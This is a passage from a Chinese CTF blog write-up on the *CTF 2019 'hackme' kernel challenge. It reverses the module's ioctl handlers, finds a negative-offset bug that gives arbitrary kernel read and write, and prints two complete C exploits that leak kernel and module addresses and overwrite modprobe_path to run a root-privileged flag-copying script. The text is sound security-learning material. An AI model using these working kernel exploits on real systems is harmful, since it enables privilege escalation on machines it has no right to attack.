<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102122263.png" alt="image-20230410212250229"></p>
<p>四个变量名字确定之后，开始分析程序</p>
<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102154053.png" alt="image-20230410215435020"></p>
<p>首先是 <code>delete</code> 部分（如上），发现这个 <code>kfree()</code> 很奇怪，因为 <code>IDA</code> 生成的伪代码看不到参数，溯源一下汇编发现 <code>kfree</code> 的参数其实就是 <code>v14</code> （如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102151664.png" alt="image-20230410215111627"></p>
<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>这个 <code>add</code> 部分可以发现 <code>v12[0]</code> 存放的是申请的 <code>chunk_addr</code> ，<code>v12[1]</code> 存放的是 <code>size</code> ，而 <code>v12</code> 本身就是 <code>pool[2*index]</code> 数组的地址，因此 <code>chunk_addr</code> 和 <code>size</code> 都记录在了 <code>pool</code> 数组中。通过 <code>copy_from_user</code> 函数向堆块中写入数据。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102156379.png" alt="image-20230410215619344"></p>
<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102220490.png" alt="image-20230410222056453"></p>
<p>如上图所示， <code>v5[1]</code> 是 <code>idx</code> 对应堆块的 <code>size</code> ，这里的 <code>offset+size</code> 只判断了是否小于 <code>v5[1]</code> ，但是忘记判断了 <code>offset+size</code> 要大于 <code>0</code>，所以这里的 <code>offset</code> 可以为负值，如果 <code>offset</code> 为负数的话，就导致了 <code>offset+chunk_addr</code> 拷贝的并不是当前指定的堆块中数据，可能是上一个堆块（低地址处）的数据，在这个 <code>show</code> 部分相当于任意地址读</p>
<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102228740.png" alt="image-20230410222823697"></p>
<p>和上面 <code>show</code> 部分的漏洞一样， <code>offset</code> 值可以为负，从而可以任意地址写。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p><code>slub</code> 分配器是 <code>Linux</code> 内核中的一种内存分配器,其分配原理和 <code>fastbin</code> 原理类似，不过这里分配的堆块没有堆块头，也就是不加 <code>0x10</code> ，申请多少就是多少。</p>
<p>利用思路就是类似于 <code>fastbin attack</code> 的手法，数组索引向上（低地址）溢出，覆盖 <code>fd</code> 指针，从而实现任意地址申请和泄露。首先去泄露出内核基地址，然后加上 <code>mod_tree</code> 在内核中的偏移（ <code>mod_tree</code> 在内核中，而里面有模块的指针，所以通常我们用它来泄露出模块的基地址）得到 <code>mod_tree</code> 地址，将其申请出来，泄露出模块的基地址。有了模块的地址，我们就可以将 <code>pool</code> 数组申请出来写入 <code>modprobe_path</code> 指针（该指针在内核中），用 <code>edit</code> 功能实现任意地址写（我猜测无法直接将 <code>fd</code> 指针控制为 <code>modprobe_path</code> 申请出来然后写入数据的原因是这样会破坏原本内核中的堆结构，如果利用 <code>pool</code> 数组任意写的话，可以将之前的堆结构再恢复）</p>
<p>上面的过程和做 <code>glibc</code> 堆题的思想基本一致，具体过程就不再赘述。</p>
<p>但我一直不明白为什么我的脚本会导致内核崩溃，就是执行完篡改 <code>modprobe_path</code> 都没有崩溃，可以看到下图是改写成功的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304172038840.png" alt="image-20230417202505374"></p>
<p>此时也没有崩溃，但是再返回到用户态调用函数或者再运行一次脚本，内核就会崩溃重启。</p>
<p>可能是我破坏了某些堆结构？可是我将之前全部破坏的指针又用任意地址写恢复了，emmm 因为是完全自己写的，所以可能是某个奇奇怪怪的地方搞坏了，不过最终思想是没问题的，因为确实是成功改掉了路径。</p>
<p>下面放一下我这个会崩溃的 <code>EXP</code> … 也算记录一下</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> index;</span><br><span class="line">    <span class="type">size_t</span> *user_ptr;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=<span class="number">0</span>;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size,<span class="type">size_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=<span class="number">0</span>;</span><br><span class="line">    data.offset=<span class="number">0</span>;</span><br><span class="line">    data.user_ptr=<span class="literal">NULL</span>;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size,<span class="type">size_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">char</span> *mem=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    add(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    show(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x1e0</span>);</span><br><span class="line">    write(<span class="number">1</span>,mem,<span class="number">16</span>);</span><br><span class="line">    <span class="type">size_t</span> kernel_address = *((<span class="type">size_t</span> *)mem);  </span><br><span class="line">    <span class="type">size_t</span> leak_heap = *((<span class="type">size_t</span> *)(mem+<span class="number">0x20</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak kernel address %llx\n&quot;</span>,kernel_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak heap address 0x%llx\n&quot;</span>,leak_heap);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_base=kernel_address<span class="number">-0x847240</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base %llx\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="type">size_t</span> mod_tree=kernel_base+<span class="number">0x811000</span>+<span class="number">0x100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mod tree %llx\n&quot;</span>,mod_tree);</span><br><span class="line">    add(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    delete(fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//attack</span></span><br><span class="line">    edit(fd,<span class="number">1</span>,&amp;mod_tree,<span class="number">0x200</span>,<span class="number">-0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">    add(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    add(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    show(fd,<span class="number">3</span>,mem,<span class="number">0x110</span>,<span class="number">-0x100</span>);</span><br><span class="line">    <span class="type">size_t</span> hackme_base = *((<span class="type">size_t</span> *)(mem+<span class="number">8</span>))<span class="number">-0x2320</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hackme_base %llx\n&quot;</span>,hackme_base); </span><br><span class="line">    <span class="type">size_t</span> pool=hackme_base+<span class="number">0x2400</span>+<span class="number">0xc0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pool address %llx\n&quot;</span>,pool);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    add(fd,<span class="number">4</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    add(fd,<span class="number">5</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    delete(fd,<span class="number">4</span>);</span><br><span class="line">    <span class="type">size_t</span> modprobe_math=kernel_base+<span class="number">0x83f960</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;modprobe_math %llx\n&quot;</span>,modprobe_math);</span><br><span class="line">    edit(fd,<span class="number">5</span>,&amp;pool,<span class="number">0x240</span>,<span class="number">-0x200</span>);</span><br><span class="line">    add(fd,<span class="number">6</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">int</span> fake_size=<span class="number">0x200</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)mem)=modprobe_math;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">8</span>))=fake_size;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x10</span>))=leak_heap+<span class="number">0x1b0</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x18</span>))=fake_size;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x20</span>))=leak_heap+<span class="number">0xe02bfb0</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x28</span>))=fake_size;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(fd,<span class="number">7</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">char</span> *str=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span> data1=leak_heap+<span class="number">0x3b0</span>;</span><br><span class="line">    <span class="type">size_t</span> data2=leak_heap+<span class="number">0xe02c3b0</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(str,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak heap address 0x%llx\n&quot;</span>,leak_heap);</span><br><span class="line">    edit(fd,<span class="number">0xc</span>,str,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line">    edit(fd,<span class="number">0xd</span>,&amp;data1,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    edit(fd,<span class="number">0xe</span>,&amp;data2,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/sir&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/sir&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    system(<span class="string">&quot;/home/pwn/sir&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /home/pwn/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>下面是 <a target="_blank" rel="noopener" href="http://p4nda.top/">P4nda</a> 师傅的脚本，我和他的思路差不多</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC 0x30000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x30001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE 0x30002</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">size_t</span> idx;</span><br><span class="line">	<span class="type">void</span> *addr;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> len;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	cmd.len = len;</span><br><span class="line">	cmd.addr = user;</span><br><span class="line">	ioctl(fd,ALLOC,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	ioctl(fd,DEL,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_from_kernel</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len,<span class="type">long</span> <span class="type">long</span> offset)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	cmd.len = len;</span><br><span class="line">	cmd.addr = user;</span><br><span class="line">	cmd.offset = offset;</span><br><span class="line">	ioctl(fd,READ,&amp;cmd);	</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_to_kernel</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len,<span class="type">long</span> <span class="type">long</span> offset)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	cmd.len = len;</span><br><span class="line">	cmd.addr = user;</span><br><span class="line">	cmd.offset = offset;</span><br><span class="line">	ioctl(fd,WRITE,&amp;cmd);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">( <span class="type">char</span> *buf,<span class="type">int</span> size)</span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;(size/<span class="number">8</span>);i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i/<span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>,*(<span class="type">size_t</span> * )(buf + i*<span class="number">8</span>));</span><br><span class="line">		<span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="type">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="type">size_t</span> heap_addr , kernel_addr,mod_addr;</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] bad open /dev/hackme\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	delete(fd,<span class="number">1</span>);</span><br><span class="line">	delete(fd,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	read_from_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">	heap_addr = *((<span class="type">size_t</span>  *)mem);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] heap addr : %16llx\n&quot;</span>,heap_addr );</span><br><span class="line">	read_from_kernel(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x200</span>);</span><br><span class="line">	kernel_addr = *((<span class="type">size_t</span>  *)(mem+<span class="number">0x28</span>)) ;</span><br><span class="line">	<span class="keyword">if</span> ((kernel_addr &amp; <span class="number">0xfff</span>) != <span class="number">0xae0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] maybe bad kernel leak : %16llx\n&quot;</span>,kernel_addr);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	kernel_addr -= <span class="number">0x849ae0</span>; <span class="comment">//0x849ae0 - sysctl_table_root</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] kernel addr : %16llx\n&quot;</span>,kernel_addr );	</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">	*((<span class="type">size_t</span> *)mem) = (<span class="number">0x811000</span> + kernel_addr + <span class="number">0x40</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">	write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">	</span><br><span class="line">	alloc(fd,<span class="number">5</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">6</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	read_from_kernel(fd,<span class="number">6</span>,mem,<span class="number">0x40</span>,<span class="number">-0x40</span>);</span><br><span class="line">	mod_addr =  *((<span class="type">size_t</span>  *)(mem+<span class="number">0x18</span>)) ;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] mod addr : %16llx\n&quot;</span>,mod_addr );	</span><br><span class="line">	</span><br><span class="line">	delete(fd,<span class="number">2</span>);</span><br><span class="line">	delete(fd,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	*((<span class="type">size_t</span> *)mem) = (<span class="number">0x2400</span> + mod_addr + <span class="number">0xc0</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">	write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">7</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	*((<span class="type">size_t</span> *)(mem+<span class="number">0x8</span>)) = <span class="number">0x100</span>; </span><br><span class="line">	*((<span class="type">size_t</span> *)mem) = (<span class="number">0x83f960</span> + kernel_addr ); <span class="comment">//ffffffff8183f960 D modprobe_path</span></span><br><span class="line">	alloc(fd,<span class="number">8</span>,mem,<span class="number">0x100</span>); <span class="comment">// pool</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">strncpy</span>(mem,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line">	write_to_kernel(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304172129949.png" alt="image-20230417212958765" style="zoom:50%;" />





<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yongbaoii/article/details/123583502">(47条消息) linux kernal pwn STARCTF 2019 hackme（一） 劫持modprobe_path_yongbaoii的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://kileak.github.io/ctf/2019/xctf-hackme/">XCTF - *CTF 2019 - hack_me | kileak</a></p>
<p><a target="_blank" rel="noopener" href="http://p4nda.top/2019/05/01/starctf-2019-hackme/">(<em>´∇｀</em>) 天亮了~ 【KERNEL PWN】STARCTF 2019 hackme 解题思路 | p4nda’s blog</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-254178.htm">原创]Linux Kernel Exploit 内核漏洞学习(4)-RW Any Memory-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/153929.html">基于modprobe_path覆盖的Linux内核漏洞利用技术 - SecPulse.COM | 安全脉搏</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/a31a5755.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/a31a5755.html" class="post-title-link" itemprop="url">关于 kernel-ROP & ret2user & bypass-SMEP 的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:59:42" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>内核态的 <code>ROP</code> 和用户态的思路和做法是一样的，都是利用 <code>gadget</code> 来不断控制执行流，进行任意的函数调用。不过获取基地址还有搜索 <code>gadget</code> 等一些小细节发生了变化，但思想不变，所以理解起来应该还是很快的</p>
